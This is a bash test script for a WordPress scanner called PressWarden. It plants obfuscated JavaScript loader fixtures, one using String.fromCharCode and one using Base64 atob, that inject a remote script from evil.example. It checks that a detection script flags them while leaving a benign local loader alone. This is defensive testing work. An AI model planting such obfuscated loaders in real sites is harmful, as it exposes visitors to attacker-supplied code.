#!/usr/bin/env bash
set -euo pipefail
ROOTDIR="$(cd "$(dirname "$0")/.." && pwd)"
TMP="${TMPDIR:-/tmp}/presswarden-js-intel.$$"
trap 'rm -rf "$TMP"' EXIT
SITE="$TMP/sites/example.com/public_html"
mkdir -p "$SITE/wp-admin" "$SITE/wp-content/plugins/malicious-charpack" "$SITE/wp-content/plugins/malicious-atob" "$SITE/wp-content/plugins/benign-decoder" "$SITE/wp-includes"
touch "$SITE/wp-settings.php" "$SITE/wp-load.php"
printf '<?php $wp_version = "7.1";\n' > "$SITE/wp-includes/version.php"

cat > "$SITE/wp-content/plugins/malicious-charpack/loader.js" <<'JS'
(function(){var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120,46,106,115);document.head.appendChild(s);}());
JS

cat > "$SITE/wp-content/plugins/malicious-atob/loader.js" <<'JS'
(function(){var s=document.createElement('script');s.src=atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUveC5qcw==');document.head.appendChild(s);}());
JS

cat > "$SITE/wp-content/plugins/benign-decoder/app.js" <<'JS'
(function(){var path=atob('L2Fzc2V0cy9hcHAuanM=');var s=document.createElement('script');s.src=path;document.head.appendChild(s);}());
JS

out=$(ROOT="$TMP/sites" PRESSWARDEN_CONFIG_FILE="$TMP/no-config" PRESSWARDEN_STATE_DIR="$TMP/state" PRESSWARDEN_CACHE_DIR="$TMP/cache" PRESSWARDEN_NOCOLOR=1 bash "$ROOTDIR/checks/js-threat-intel.sh" 2>&1 || true)
printf '%s\n' "$out" | grep -q 'malicious-charpack/loader.js' || { printf '%s\n' "$out" >&2; printf 'packed remote JS loader was not detected\n' >&2; exit 1; }
printf '%s\n' "$out" | grep -q 'malicious-atob/loader.js' || { printf '%s\n' "$out" >&2; printf 'Base64 remote JS loader was not detected\n' >&2; exit 1; }
if printf '%s\n' "$out" | grep -q 'benign-decoder/app.js'; then
  printf '%s\n' "$out" >&2
  printf 'decoded local asset loader was falsely flagged\n' >&2
  exit 1
fi

printf 'PressWarden JavaScript threat-intel fixtures: PASS\n'
